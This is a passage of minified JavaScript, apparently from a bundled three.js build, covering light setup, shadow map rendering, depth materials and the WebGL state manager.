m=i[h];if(m.id===null)break;m.id=null,m.object=null,m.geometry=null,m.material=null,m.group=null}}return{opaque:e,transmissive:n,transparent:r,init:s,push:a,unshift:l,finish:u,sort:c}}function Cf(){let i=new WeakMap;function t(n,r){const s=i.get(n);let o;return s===void 0?(o=new ka,i.set(n,[o])):r>=s.length?(o=new ka,s.push(o)):o=s[r],o}function e(){i=new WeakMap}return{get:t,dispose:e}}function Pf(){const i={};return{get:function(t){if(i[t.id]!==void 0)return i[t.id];let e;switch(t.type){case"DirectionalLight":e={direction:new L,color:new Ht};break;case"SpotLight":e={position:new L,direction:new L,color:new Ht,distance:0,coneCos:0,penumbraCos:0,decay:0};break;case"PointLight":e={position:new L,color:new Ht,distance:0,decay:0};break;case"HemisphereLight":e={direction:new L,skyColor:new Ht,groundColor:new Ht};break;case"RectAreaLight":e={color:new Ht,position:new L,halfWidth:new L,halfHeight:new L};break}return i[t.id]=e,e}}}function If(){const i={};return{get:function(t){if(i[t.id]!==void 0)return i[t.id];let e;switch(t.type){case"DirectionalLight":e={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new zt};break;case"SpotLight":e={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new zt};break;case"PointLight":e={shadowBias:0,shadowNormalBias:0,shadowRadius:1,shadowMapSize:new zt,shadowCameraNear:1,shadowCameraFar:1e3};break}return i[t.id]=e,e}}}let Lf=0;function Df(i,t){return(t.castShadow?2:0)-(i.castShadow?2:0)+(t.map?1:0)-(i.map?1:0)}function Nf(i,t){const e=new Pf,n=If(),r={version:0,hash:{directionalLength:-1,pointLength:-1,spotLength:-1,rectAreaLength:-1,hemiLength:-1,numDirectionalShadows:-1,numPointShadows:-1,numSpotShadows:-1,numSpotMaps:-1,numLightProbes:-1},ambient:[0,0,0],probe:[],directional:[],directionalShadow:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotLightMap:[],spotShadow:[],spotShadowMap:[],spotLightMatrix:[],rectArea:[],rectAreaLTC1:null,rectAreaLTC2:null,point:[],pointShadow:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],numSpotLightShadowsWithMaps:0,numLightProbes:0};for(let u=0;u<9;u++)r.probe.push(new L);const s=new L,o=new Zt,a=new Zt;function l(u,h){let p=0,m=0,E=0;for(let X=0;X<9;X++)r.probe[X].set(0,0,0);let x=0,f=0,d=0,g=0,_=0,v=0,w=0,S=0,T=0,D=0,y=0;u.sort(Df);const R=h===!0?Math.PI:1;for(let X=0,et=u.length;X<et;X++){const P=u[X],B=P.color,W=P.intensity,Y=P.distance,H=P.shadow&&P.shadow.map?P.shadow.map.texture:null;if(P.isAmbientLight)p+=B.r*W*R,m+=B.g*W*R,E+=B.b*W*R;else if(P.isLightProbe){for(let V=0;V<9;V++)r.probe[V].addScaledVector(P.sh.coefficients[V],W);y++}else if(P.isDirectionalLight){const V=e.get(P);if(V.color.copy(P.color).multiplyScalar(P.intensity*R),P.castShadow){const q=P.shadow,J=n.get(P);J.shadowBias=q.bias,J.shadowNormalBias=q.normalBias,J.shadowRadius=q.radius,J.shadowMapSize=q.mapSize,r.directionalShadow[x]=J,r.directionalShadowMap[x]=H,r.directionalShadowMatrix[x]=P.shadow.matrix,v++}r.directional[x]=V,x++}else if(P.isSpotLight){const V=e.get(P);V.position.setFromMatrixPosition(P.matrixWorld),V.color.copy(B).multiplyScalar(W*R),V.distance=Y,V.coneCos=Math.cos(P.angle),V.penumbraCos=Math.cos(P.angle*(1-P.penumbra)),V.decay=P.decay,r.spot[d]=V;const q=P.shadow;if(P.map&&(r.spotLightMap[T]=P.map,T++,q.updateMatrices(P),P.castShadow&&D++),r.spotLightMatrix[d]=q.matrix,P.castShadow){const J=n.get(P);J.shadowBias=q.bias,J.shadowNormalBias=q.normalBias,J.shadowRadius=q.radius,J.shadowMapSize=q.mapSize,r.spotShadow[d]=J,r.spotShadowMap[d]=H,S++}d++}else if(P.isRectAreaLight){const V=e.get(P);V.color.copy(B).multiplyScalar(W),V.halfWidth.set(P.width*.5,0,0),V.halfHeight.set(0,P.height*.5,0),r.rectArea[g]=V,g++}else if(P.isPointLight){const V=e.get(P);if(V.color.copy(P.color).multiplyScalar(P.intensity*R),V.distance=P.distance,V.decay=P.decay,P.castShadow){const q=P.shadow,J=n.get(P);J.shadowBias=q.bias,J.shadowNormalBias=q.normalBias,J.shadowRadius=q.radius,J.shadowMapSize=q.mapSize,J.shadowCameraNear=q.camera.near,J.shadowCameraFar=q.camera.far,r.pointShadow[f]=J,r.pointShadowMap[f]=H,r.pointShadowMatrix[f]=P.shadow.matrix,w++}r.point[f]=V,f++}else if(P.isHemisphereLight){const V=e.get(P);V.skyColor.copy(P.color).multiplyScalar(W*R),V.groundColor.copy(P.groundColor).multiplyScalar(W*R),r.hemi[_]=V,_++}}g>0&&(t.isWebGL2?i.has("OES_texture_float_linear")===!0?(r.rectAreaLTC1=it.LTC_FLOAT_1,r.rectAreaLTC2=it.LTC_FLOAT_2):(r.rectAreaLTC1=it.LTC_HALF_1,r.rectAreaLTC2=it.LTC_HALF_2):i.has("OES_texture_float_linear")===!0?(r.rectAreaLTC1=it.LTC_FLOAT_1,r.rectAreaLTC2=it.LTC_FLOAT_2):i.has("OES_texture_half_float_linear")===!0?(r.rectAreaLTC1=it.LTC_HALF_1,r.rectAreaLTC2=it.LTC_HALF_2):console.error("THREE.WebGLRenderer: Unable to use RectAreaLight. Missing WebGL extensions.")),r.ambient[0]=p,r.ambient[1]=m,r.ambient[2]=E;const k=r.hash;(k.directionalLength!==x||k.pointLength!==f||k.spotLength!==d||k.rectAreaLength!==g||k.hemiLength!==_||k.numDirectionalShadows!==v||k.numPointShadows!==w||k.numSpotShadows!==S||k.numSpotMaps!==T||k.numLightProbes!==y)&&(r.directional.length=x,r.spot.length=d,r.rectArea.length=g,r.point.length=f,r.hemi.length=_,r.directionalShadow.length=v,r.directionalShadowMap.length=v,r.pointShadow.length=w,r.pointShadowMap.length=w,r.spotShadow.length=S,r.spotShadowMap.length=S,r.directionalShadowMatrix.length=v,r.pointShadowMatrix.length=w,r.spotLightMatrix.length=S+T-D,r.spotLightMap.length=T,r.numSpotLightShadowsWithMaps=D,r.numLightProbes=y,k.directionalLength=x,k.pointLength=f,k.spotLength=d,k.rectAreaLength=g,k.hemiLength=_,k.numDirectionalShadows=v,k.numPointShadows=w,k.numSpotShadows=S,k.numSpotMaps=T,k.numLightProbes=y,r.version=Lf++)}function c(u,h){let p=0,m=0,E=0,x=0,f=0;const d=h.matrixWorldInverse;for(let g=0,_=u.length;g<_;g++){const v=u[g];if(v.isDirectionalLight){const w=r.directional[p];w.direction.setFromMatrixPosition(v.matrixWorld),s.setFromMatrixPosition(v.target.matrixWorld),w.direction.sub(s),w.direction.transformDirection(d),p++}else if(v.isSpotLight){const w=r.spot[E];w.position.setFromMatrixPosition(v.matrixWorld),w.position.applyMatrix4(d),w.direction.setFromMatrixPosition(v.matrixWorld),s.setFromMatrixPosition(v.target.matrixWorld),w.direction.sub(s),w.direction.transformDirection(d),E++}else if(v.isRectAreaLight){const w=r.rectArea[x];w.position.setFromMatrixPosition(v.matrixWorld),w.position.applyMatrix4(d),a.identity(),o.copy(v.matrixWorld),o.premultiply(d),a.extractRotation(o),w.halfWidth.set(v.width*.5,0,0),w.halfHeight.set(0,v.height*.5,0),w.halfWidth.applyMatrix4(a),w.halfHeight.applyMatrix4(a),x++}else if(v.isPointLight){const w=r.point[m];w.position.setFromMatrixPosition(v.matrixWorld),w.position.applyMatrix4(d),m++}else if(v.isHemisphereLight){const w=r.hemi[f];w.direction.setFromMatrixPosition(v.matrixWorld),w.direction.transformDirection(d),f++}}}return{setup:l,setupView:c,state:r}}function Ba(i,t){const e=new Nf(i,t),n=[],r=[];function s(){n.length=0,r.length=0}function o(h){n.push(h)}function a(h){r.push(h)}function l(h){e.setup(n,h)}function c(h){e.setupView(n,h)}return{init:s,state:{lightsArray:n,shadowsArray:r,lights:e},setupLights:l,setupLightsView:c,pushLight:o,pushShadow:a}}function Uf(i,t){let e=new WeakMap;function n(s,o=0){const a=e.get(s);let l;return a===void 0?(l=new Ba(i,t),e.set(s,[l])):o>=a.length?(l=new Ba(i,t),a.push(l)):l=a[o],l}function r(){e=new WeakMap}return{get:n,dispose:r}}class Of extends gi{constructor(t){super(),this.isMeshDepthMaterial=!0,this.type="MeshDepthMaterial",this.depthPacking=Pl,this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.wireframe=!1,this.wireframeLinewidth=1,this.setValues(t)}copy(t){return super.copy(t),this.depthPacking=t.depthPacking,this.map=t.map,this.alphaMap=t.alphaMap,this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this.wireframe=t.wireframe,this.wireframeLinewidth=t.wireframeLinewidth,this}}class Ff extends gi{constructor(t){super(),this.isMeshDistanceMaterial=!0,this.type="MeshDistanceMaterial",this.map=null,this.alphaMap=null,this.displacementMap=null,this.displacementScale=1,this.displacementBias=0,this.setValues(t)}copy(t){return super.copy(t),this.map=t.map,this.alphaMap=t.alphaMap,this.displacementMap=t.displacementMap,this.displacementScale=t.displacementScale,this.displacementBias=t.displacementBias,this}}const kf=`void main() {
	gl_Position = vec4( position, 1.0 );
}`,Bf=`uniform sampler2D shadow_pass;
uniform vec2 resolution;
uniform float radius;
#include <packing>
void main() {
	const float samples = float( VSM_SAMPLES );
	float mean = 0.0;
	float squared_mean = 0.0;
	float uvStride = samples <= 1.0 ? 0.0 : 2.0 / ( samples - 1.0 );
	float uvStart = samples <= 1.0 ? 0.0 : - 1.0;
	for ( float i = 0.0; i < samples; i ++ ) {
		float uvOffset = uvStart + i * uvStride;
		#ifdef HORIZONTAL_PASS
			vec2 distribution = unpackRGBATo2Half( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( uvOffset, 0.0 ) * radius ) / resolution ) );
			mean += distribution.x;
			squared_mean += distribution.y * distribution.y + distribution.x * distribution.x;
		#else
			float depth = unpackRGBAToDepth( texture2D( shadow_pass, ( gl_FragCoord.xy + vec2( 0.0, uvOffset ) * radius ) / resolution ) );
			mean += depth;
			squared_mean += depth * depth;
		#endif
	}
	mean = mean / samples;
	squared_mean = squared_mean / samples;
	float std_dev = sqrt( squared_mean - mean * mean );
	gl_FragColor = pack2HalfToRGBA( vec2( mean, std_dev ) );
}`;function zf(i,t,e){let n=new So;const r=new zt,s=new zt,o=new ce,a=new Of({depthPacking:Il}),l=new Ff,c={},u=e.maxTextureSize,h={[cn]:Ee,[Ee]:cn,[Oe]:Oe},p=new An({defines:{VSM_SAMPLES:8},uniforms:{shadow_pass:{value:null},resolution:{value:new zt},radius:{value:4}},vertexShader:kf,fragmentShader:Bf}),m=p.clone();m.defines.HORIZONTAL_PASS=1;const E=new Ie;E.setAttribute("position",new Be(new Float32Array([-1,-1,.5,3,-1,.5,-1,3,.5]),3));const x=new He(E,p),f=this;this.enabled=!1,this.autoUpdate=!0,this.needsUpdate=!1,this.type=to;let d=this.type;this.render=function(S,T,D){if(f.enabled===!1||f.autoUpdate===!1&&f.needsUpdate===!1||S.length===0)return;const y=i.getRenderTarget(),R=i.getActiveCubeFace(),k=i.getActiveMipmapLevel(),X=i.state;X.setBlending(an),X.buffers.color.setClear(1,1,1,1),X.buffers.depth.setTest(!0),X.setScissorTest(!1);const et=d!==$e&&this.type===$e,P=d===$e&&this.type!==$e;for(let B=0,W=S.length;B<W;B++){const Y=S[B],H=Y.shadow;if(H===void 0){console.warn("THREE.WebGLShadowMap:",Y,"has no shadow.");continue}if(H.autoUpdate===!1&&H.needsUpdate===!1)continue;r.copy(H.mapSize);const V=H.getFrameExtents();if(r.multiply(V),s.copy(H.mapSize),(r.x>u||r.y>u)&&(r.x>u&&(s.x=Math.floor(u/V.x),r.x=s.x*V.x,H.mapSize.x=s.x),r.y>u&&(s.y=Math.floor(u/V.y),r.y=s.y*V.y,H.mapSize.y=s.y)),H.map===null||et===!0||P===!0){const J=this.type!==$e?{minFilter:ge,magFilter:ge}:{};H.map!==null&&H.map.dispose(),H.map=new Tn(r.x,r.y,J),H.map.texture.name=Y.name+".shadowMap",H.camera.updateProjectionMatrix()}i.setRenderTarget(H.map),i.clear();const q=H.getViewportCount();for(let J=0;J<q;J++){const K=H.getViewport(J);o.set(s.x*K.x,s.y*K.y,s.x*K.z,s.y*K.w),X.viewport(o),H.updateMatrices(Y,J),n=H.getFrustum(),v(T,D,H.camera,Y,this.type)}H.isPointLightShadow!==!0&&this.type===$e&&g(H,D),H.needsUpdate=!1}d=this.type,f.needsUpdate=!1,i.setRenderTarget(y,R,k)};function g(S,T){const D=t.update(x);p.defines.VSM_SAMPLES!==S.blurSamples&&(p.defines.VSM_SAMPLES=S.blurSamples,m.defines.VSM_SAMPLES=S.blurSamples,p.needsUpdate=!0,m.needsUpdate=!0),S.mapPass===null&&(S.mapPass=new Tn(r.x,r.y)),p.uniforms.shadow_pass.value=S.map.texture,p.uniforms.resolution.value=S.mapSize,p.uniforms.radius.value=S.radius,i.setRenderTarget(S.mapPass),i.clear(),i.renderBufferDirect(T,null,D,p,x,null),m.uniforms.shadow_pass.value=S.mapPass.texture,m.uniforms.resolution.value=S.mapSize,m.uniforms.radius.value=S.radius,i.setRenderTarget(S.map),i.clear(),i.renderBufferDirect(T,null,D,m,x,null)}function _(S,T,D,y){let R=null;const k=D.isPointLight===!0?S.customDistanceMaterial:S.customDepthMaterial;if(k!==void 0)R=k;else if(R=D.isPointLight===!0?l:a,i.localClippingEnabled&&T.clipShadows===!0&&Array.isArray(T.clippingPlanes)&&T.clippingPlanes.length!==0||T.displacementMap&&T.displacementScale!==0||T.alphaMap&&T.alphaTest>0||T.map&&T.alphaTest>0){const X=R.uuid,et=T.uuid;let P=c[X];P===void 0&&(P={},c[X]=P);let B=P[et];B===void 0&&(B=R.clone(),P[et]=B,T.addEventListener("dispose",w)),R=B}if(R.visible=T.visible,R.wireframe=T.wireframe,y===$e?R.side=T.shadowSide!==null?T.shadowSide:T.side:R.side=T.shadowSide!==null?T.shadowSide:h[T.side],R.alphaMap=T.alphaMap,R.alphaTest=T.alphaTest,R.map=T.map,R.clipShadows=T.clipShadows,R.clippingPlanes=T.clippingPlanes,R.clipIntersection=T.clipIntersection,R.displacementMap=T.displacementMap,R.displacementScale=T.displacementScale,R.displacementBias=T.displacementBias,R.wireframeLinewidth=T.wireframeLinewidth,R.linewidth=T.linewidth,D.isPointLight===!0&&R.isMeshDistanceMaterial===!0){const X=i.properties.get(R);X.light=D}return R}function v(S,T,D,y,R){if(S.visible===!1)return;if(S.layers.test(T.layers)&&(S.isMesh||S.isLine||S.isPoints)&&(S.castShadow||S.receiveShadow&&R===$e)&&(!S.frustumCulled||n.intersectsObject(S))){S.modelViewMatrix.multiplyMatrices(D.matrixWorldInverse,S.matrixWorld);const et=t.update(S),P=S.material;if(Array.isArray(P)){const B=et.groups;for(let W=0,Y=B.length;W<Y;W++){const H=B[W],V=P[H.materialIndex];if(V&&V.visible){const q=_(S,V,y,R);S.onBeforeShadow(i,S,T,D,et,q,H),i.renderBufferDirect(D,null,et,q,S,H),S.onAfterShadow(i,S,T,D,et,q,H)}}}else if(P.visible){const B=_(S,P,y,R);S.onBeforeShadow(i,S,T,D,et,B,null),i.renderBufferDirect(D,null,et,B,S,null),S.onAfterShadow(i,S,T,D,et,B,null)}}const X=S.children;for(let et=0,P=X.length;et<P;et++)v(X[et],T,D,y,R)}function w(S){S.target.removeEventListener("dispose",w);for(const D in c){const y=c[D],R=S.target.uuid;R in y&&(y[R].dispose(),delete y[R])}}}function Gf(i,t,e){const n=e.isWebGL2;function r(){let C=!1;const st=new ce;let at=null;const Mt=new ce(0,0,0,0);return{setMask:function(xt){at!==xt&&!C&&(i.colorMask(xt,xt,xt,xt),at=xt)},setLocked:function(xt){C=xt},setClear:function(xt,Xt,qt,se,he){he===!0&&(xt*=se,Xt*=se,qt*=se),st.set(xt,Xt,qt,se),Mt.equals(st)===!1&&(i.clearColor(xt,Xt,qt,se),Mt.copy(st))},reset:function(){C=!1,at=null,Mt.set(-1,0,0,0)}}}function s(){let C=!1,st=null,at=null,Mt=null;return{setTest:function(xt){xt?Tt(i.DEPTH_TEST):gt(i.DEPTH_TEST)},setMask:function(xt){st!==xt&&!C&&(i.depthMask(xt),st=xt)},setFunc:function(xt){if(at!==xt){switch(xt){case al:i.depthFunc(i.NEVER);break;case ol:i.depthFunc(i.ALWAYS);break;case ll:i.depthFunc(i.LESS);break;case Yi:i.depthFunc(i.LEQUAL);break;case cl:i.depthFunc(i.EQUAL);break;case dl:i.depthFunc(i.GEQUAL);break;case ul:i.depthFunc(i.GREATER);break;case pl:i.depthFunc(i.NOTEQUAL);break;default:i.depthFunc(i.LEQUAL)}at=xt}},setLocked:function(xt){C=xt},setClear:function(xt){Mt!==xt&&(i.clearDepth(xt),Mt=xt)},reset:function(){C=!1,st=null,at=null,Mt=null}}}function o(){let C=!1,st=null,at=null,Mt=null,xt=null,Xt=null,qt=null,se=null,he=null;return{setTest:function(Yt){C||(Yt?Tt(i.STENCIL_TEST):gt(i.STENCIL_TEST))},setMask:function(Yt){st!==Yt&&!C&&(i.stencilMask(Yt),st=Yt)},setFunc:function(Yt,me,ze){(at!==Yt||Mt!==me||xt!==ze)&&(i.stencilFunc(Yt,me,ze),at=Yt,Mt=me,xt=ze)},setOp:function(Yt,me,ze){(Xt!==Yt||qt!==me||se!==ze)&&(i.stencilOp(Yt,me,ze),Xt=Yt,qt=me,se=ze)},setLocked:function(Yt){C=Yt},setClear:function(Yt){he!==Yt&&(i.clearStencil(Yt),he=Yt)},reset:function(){C=!1,st=null,at=null,Mt=null,xt=null,Xt=null,qt=null,se=null,he=null}}}const a=new r,l=new s,c=new o,u=new WeakMap,h=new WeakMap;let p={},m={},E=new WeakMap,x=[],f=null,d=!1,g=null,_=null,v=null,w=null,S=null,T=null,D=null,y=new Ht(0,0,0),R=0,k=!1,X=null,et=null,P=null,B=null,W=null;const Y=i.getParameter(i.MAX_COMBINED_TEXTURE_IMAGE_UNITS);let H=!1,V=0;const q=i.getParameter(i.VERSION);q.indexOf("WebGL")!==-1?(V=parseFloat(/^WebGL (\d)/.exec(q)[1]),H=V>=1):q.indexOf("OpenGL ES")!==-1&&(V=parseFloat(/^OpenGL ES (\d)/.exec(q)[1]),H=V>=2);let J=null,K={};const G=i.getParameter(i.SCISSOR_BOX),j=i.getParameter(i.VIEWPORT),rt=new ce().fromArray(G),pt=new ce().fromArray(j);function ut(C,st,at,Mt){const xt=new Uint8Array(4),Xt=i.createTexture();i.bindTexture(C,Xt),i.texParameteri(C,i.TEXTURE_MIN_FILTER,i.NEAREST),i.texParameteri(C,i.TEXTURE_MAG_FILTER,i.NEAREST);for(let qt=0;qt<at;qt++)n&&(C===i.TEXTURE_3D||C===i.TEXTURE_2D_ARRAY)?i.texImage3D(st,0,i.RGBA,1,1,Mt,0,i.RGBA,i.UNSIGNED_BYTE,xt):i.texImage2D(st+qt,0,i.RGBA,1,1,0,i.RGBA,i.UNSIGNED_BYTE,xt);return Xt}const St={};St[i.TEXTURE_2D]=ut(i.TEXTURE_2D,i.TEXTURE_2D,1),St[i.TEXTURE_CUBE_MAP]=ut(i.TEXTURE_CUBE_MAP,i.TEXTURE_CUBE_MAP_POSITIVE_X,6),n&&(St[i.TEXTURE_2D_ARRAY]=ut(i.TEXTURE_2D_ARRAY,i.TEXTURE_2D_ARRAY,1,1),St[i.TEXTURE_3D]=ut(i.TEXTURE_3D,i.TEXTURE_3D,1,1)),a.setClear(0,0,0,1),l.setClear(1),c.setClear(0),Tt(i.DEPTH_TEST),l.setFunc(Yi),Lt(!1),A(Es),Tt(i.CULL_FACE),ft(an);function Tt(C){p[C]!==!0&&(i.enable(C),p[C]=!0)}function gt(C){p[C]!==!1&&(i.disable(C),p[C]=!1)}function Ut(C,st){return m[C]!==st?(i.bindFramebuffer(C,st),m[C]=st,n&&(C===i.DRAW_FRAMEBUFFER&&(m[i.FRAMEBUFFER]=st),C===i.FRAMEBUFFER&&(m[i.DRAW_FRAMEBUFFER]=st)),!0):!1}function N(C,st){let at=x,Mt=!1;if(C)if(at=E.get(st),at===void 0&&(at=[],E.set(st,at)),C.isWebGLMultipleRenderTargets){const xt=C.texture;if(at.length!==xt.length||at[0]!==i.COLOR_ATTACHMENT0){for(let Xt=0,qt=xt.length;Xt<qt;Xt++)at[Xt]=i.COLOR_ATTACHMENT0+Xt;at.length=xt.length,Mt=!0}}else at[0]!==i.COLOR_ATTACHMENT0&&(at[0]=i.COLOR_ATTACHMENT0,Mt=!0);else at[0]!==i.BACK&&(at[0]=i.BACK,Mt=!0);Mt&&(e.isWebGL2?i.drawBuffers(at):t.get("WEBGL_draw_buffers").drawBuffersWEBGL(at))}function ne(C){return f!==C?(i.useProgram(C),f=C,!0):!1}const vt={[vn]:i.FUNC_ADD,[Xo]:i.FUNC_SUBTRACT,[qo]:i.FUNC_REVERSE_SUBTRACT};if(n)vt[bs]=i.MIN,vt[Ts]=i.MAX;else{const C=t.get("EXT_blend_minmax");C!==null&&(vt[bs]=C.MIN_EXT,vt[Ts]=C.MAX_EXT)}const Rt={[Yo]:i.ZERO,[jo]:i.ONE,[$o]:i.SRC_COLOR,[Yr]:i.SRC_ALPHA,[el]:i.SRC_ALPHA_SATURATE,[Qo]:i.DST_COLOR,[Zo]:i.DST_ALPHA,[Ko]:i.ONE_MINUS_SRC_COLOR,[jr]:i.ONE_MINUS_SRC_ALPHA,[tl]:i.ONE_MINUS_DST_COLOR,[Jo]:i.ONE_MINUS_DST_ALPHA,[nl]:i.CONSTANT_COLOR,[il]:i.ONE_MINUS_CONSTANT_COLOR,[rl]:i.CONSTANT_ALPHA,[sl]:i.ONE_MINUS_CONSTANT_ALPHA};function ft(C,st,at,Mt,xt,Xt,qt,se,he,Yt){if(C===an){d===!0&&(gt(i.BLEND),d=!1);return}if(d===!1&&(Tt(i.BLEND),d=!0),C!==Wo){if(C!==g||Yt!==k){if((_!==vn||S!==vn)&&(i.blendEquation(i.FUNC_ADD),_=vn,S=vn),Yt)switch(C){case Yn:i.blendFuncSeparate(i.ONE,i.ONE_MINUS_SRC_ALPHA,i.ONE,i.ONE_MINUS_SRC_ALPHA);break;case ys:i.blendFunc(i.ONE,i.ONE);break;case Ms:i.blendFuncSeparate(i.ZERO,i.ONE_MINUS_SRC_COLOR,i.ZERO,i.ONE);break;case Ss:i.blendFuncSeparate(i.ZERO,i.SRC_COLOR,i.ZERO,i.SRC_ALPHA);break;default:console.error("THREE.WebGLState: Invalid blending: ",C);break}else switch(C){case Yn:i.blendFuncSeparate(i.SRC_ALPHA,i.ONE_MINUS_SRC_ALPHA,i.ONE,i.ONE_MINUS_SRC_ALPHA);break;case ys:i.blendFunc(i.SRC_ALPHA,i.ONE);break;case Ms:i.blendFuncSeparate(i.ZERO,i.ONE_MINUS_SRC_COLOR,i.ZERO,i.ONE);break;case Ss:i.blendFunc(i.ZERO,i.SRC_COLOR);break;default:console.error("THREE.WebGLState: Invalid blending: ",C);break}v=null,w=null,T=null,D=null,y.set(0,0,0),R=0,g=C,k=Yt}return}xt=xt||st,Xt=Xt||at,qt=qt||Mt,(st!==_||xt!==S)&&(i.blendEquationSeparate(vt[st],vt[xt]),_=st,S=xt),(at!==v||Mt!==w||Xt!==T||qt!==D)&&(i.blendFuncSeparate(Rt[at],Rt[Mt],Rt[Xt],Rt[qt]),v=at,w=Mt,T=Xt,D=qt),(se.equals(y)===!1||he!==R)&&(i.blendColor(se.r,se.g,se.b,he),y.copy(se),R=he),g=C,k=!1}function $t(C,st){C.side===Oe?gt(i.CULL_FACE):Tt(i.CULL_FACE);let at=C.side===Ee;st&&(at=!at),Lt(at),C.blending===Yn&&C.transparent===!1?ft(an):ft(C.blending,C.blendEquation,C.blendSrc,C.blendDst,C.blendEquationAlpha,C.blendSrcAlpha,C.blendDstAlpha,C.blendColor,C.blendAlpha,C.premultipliedAlpha),l.setFunc(C.depthFunc),l.setTest(C.depthTest),l.setMask(C.depthWrite),a.setMask(C.colorWrite);const Mt=C.stencilWrite;c.setTest(Mt),Mt&&(c.setMask(C.stencilWriteMask),c.setFunc(C.stencilFunc,C.stencilRef,C.stencilFuncMask),c.setOp(C.stencilFail,C.stencilZFail,C.stencilZPass)),O(C.polygonOffset,C.polygonOffsetFactor,C.polygonOffsetUnits),C.alphaToCoverage===!0?Tt(i.SAMPLE_ALPHA_TO_COVERAGE):gt(i.SAMPLE_ALPHA_TO_COVERAGE)}function Lt(C){X!==C&&(C?i.frontFace(i.CW):i.frontFace(i.CCW),X=C)}function A(C){C!==Go?(Tt(i.CULL_FACE),C!==et&&(C===Es?i.cullFace(i.BACK):C===Ho?i.cullFace(i.FRONT):i.cullFace(i.FRONT_AND_BACK))):gt(i.CULL_FACE),et=C}function M(C){C!==P&&(H&&i.lineWidth(C),P=C)}function O(C,st,at){C?(Tt(i.POLYGON_OFFSET_FILL),(B!==st||W!==at)&&(i.polygonOffset(st,at),B=st,W=at)):gt(i.POLYGON_OFFSET_FILL)}function Q(C){C?Tt(i.SCISSOR_TEST):gt(i.SCISSOR_TEST)}function Z(C){C===void 0&&(C=i.TEXTURE0+Y-1),J!==C&&(i.activeTexture(C),J=C)}function tt(C,st,at){at===void 0&&(J===null?at=i.TEXTURE0+Y-1:at=J);let Mt=K[at];Mt===void 0&&(Mt={type:void 0,texture:void 0},K[at]=Mt),(Mt.type!==C||Mt.texture!==st)&&(J!==at&&(i.activeTexture(at),J=at),i.bindTexture(C,st||St[C]),Mt.type=C,Mt.texture=st)}function ht(){const C=K[J];C!==void 0&&C.type!==void 0&&(i.bindTexture(C.type,null),C.type=void 0,C.texture=void 0)}function ot(){try{i.compressedTexImage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function ct(){try{i.compressedTexImage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function yt(){try{i.texSubImage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function Dt(){try{i.texSubImage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function $(){try{i.compressedTexSubImage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function Vt(){try{i.compressedTexSubImage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function Bt(){try{i.texStorage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function At(){try{i.texStorage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function _t(){try{i.texImage2D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function dt(){try{i.texImage3D.apply(i,arguments)}catch(C){console.error("THREE.WebGLState:",C)}}function Pt(C){rt.equals(C)===!1&&(i.scissor(C.x,C.y,C.z,C.w),rt.copy(C))}function Gt(C){pt.equals(C)===!1&&(i.viewport(C.x,C.y,C.z,C.w),pt.copy(C))}function Jt(C,st){let at=h.get(st);at===void 0&&(at=new WeakMap,h.set(st,at));let Mt=at.get(C);Mt===void 0&&(Mt=i.getUniformBlockIndex(st,C.name),at.set(C,Mt))}function Ot(C,st){const Mt=h.get(st).get(C);u.get(st)!==Mt&&(i.uniformBlockBinding(st,Mt,C.__bindingPointIndex),u.set(st,Mt))}function nt(){i.disable(i.BLEND),i.disable(i.CULL_FACE),i.disable(i.DEPTH_TEST),i.disable(i.POLYGON_OFFSET_FILL),i.disable(i.SCISSOR_TEST),i.disable(i.STENCIL_TEST),i.disable(i.SAMPLE_ALPHA_TO_COVERAGE),i.blendEquation(i.FUNC_ADD),i.blendFunc(i.ONE,i.ZERO),i.blendFuncSeparate(i.ONE,i.ZERO,i.ONE,i.ZERO),i.blendColor(0,0,0,0),i.colorMask(!0,!0,!0,!0),i.clearColor(0,0,0,0),i.depthMask(!0),i.depthFunc(i.LESS),i.clearDepth(1),i.stencilMask(4294967295),i.stencilFunc(i.ALWAYS,0,4294967295),i.stencilOp(i.KEEP,i.KEEP,i.KEEP),i.clearStencil(0),i.cullFace(i.BACK),i.frontFace(i.CCW),i.polygonOffset(0,0),i.activeTexture(i.TEXTURE0),i.bindFramebuffer(i.FRAMEBUFFER,null),n===!0&&(i.bindFramebuffer(i.DRAW_FRAMEBUFFER,null),i.bindFramebuffer(i.READ_FRAMEBUFFER,null)),i.useProgram(null),i.lineWidth(1),i.scissor(0,0,i.canvas.width,i.canvas.height),i.viewport(0,0,i.canvas.width,i.canvas.height),p={},J=null,K={},m={},E=new WeakMap,x=[],f=null,d=!1,g=null,_=null,v=null,w=null,S=null,T=null,D=null,y=new Ht(0,0,0),R=0,k=!1,X=null,et=null,P=null,B=null,W=null,rt.set(0,0,i.canvas.width,i.canvas.height),pt.set(0,0,i.canvas.width,i.canvas.height),a.reset(),l.reset(),c.reset()}return{buffers:{color:a,depth:l,stencil:c},enable:Tt,disable:gt,bindFramebuffer:Ut,drawBuffers:N,useProgram:ne,setBlending:ft,setMaterial:$t,setFlipSided:Lt,setCullFace:A,setLineWidth:M,setPolygonOffset:O,setScissorTest:Q,activeTexture:Z,bindTexture:tt,unbindTexture:ht,compressedTexImage2D:ot,compressedTexImage3D:ct,texImage2D:_t,texImage3D:dt,updateUBOMapping:Jt,uniformBlockBinding:Ot,texStorage2D:Bt,texStorage3D:At,texSubImage2D:yt,texSubImage3D:Dt,compressedTexSubImage2D:$,compressedTexSubImage3D:Vt,scissor:Pt,viewport:Gt,reset:nt}}function Hf(i,t,e,n,r,s,o){const a=r.isWebGL2,l=t.has("WEBGL_multisampled_render_to_texture")?t.get("WEBGL_multisampled_render_to_texture"):null,c=typeof 